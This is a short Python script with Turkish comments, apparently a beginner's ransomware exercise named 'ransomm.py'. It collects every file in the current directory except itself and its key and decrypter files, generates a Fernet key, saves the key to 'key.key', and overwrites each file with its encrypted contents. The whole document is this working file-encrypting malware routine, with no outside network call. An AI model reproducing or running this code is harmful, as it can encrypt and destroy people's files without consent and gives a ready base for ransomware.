import os
from cryptography.fernet import Fernet

fileList = []

for file in os.listdir():
    if file == "ransomm.py" or file == "key.key" or file == "ransomdecrypter.py": # Python dosyasını şifrelemememiz gerekiyor.
        continue
    if os.path.isfile(file): # Klasörler veya başka tipteki yapılar için bir kontrol yapıyoruz. Eğer dosya bulursak liste içine ekliyoruz.
        fileList.append(file)

print(fileList)

key = Fernet.generate_key()

print(key)

with open("key.key","wb") as generatedKey:
    generatedKey.write(key) # keyimizi dosyanın içine yazdık.

for file in fileList:
    with open(file,"rb") as theFile:
        contents = theFile.read() # dosya içeriklerimizi okuduk
    contentsEncrypted = Fernet(key).encrypt(contents) # okuduğumuz dosya içeriklerini key ile şifreledik.
    with open(file,"wb") as theFile:
        theFile.write(contentsEncrypted) # şifrediğimiz içeriği dosyaya yazdık.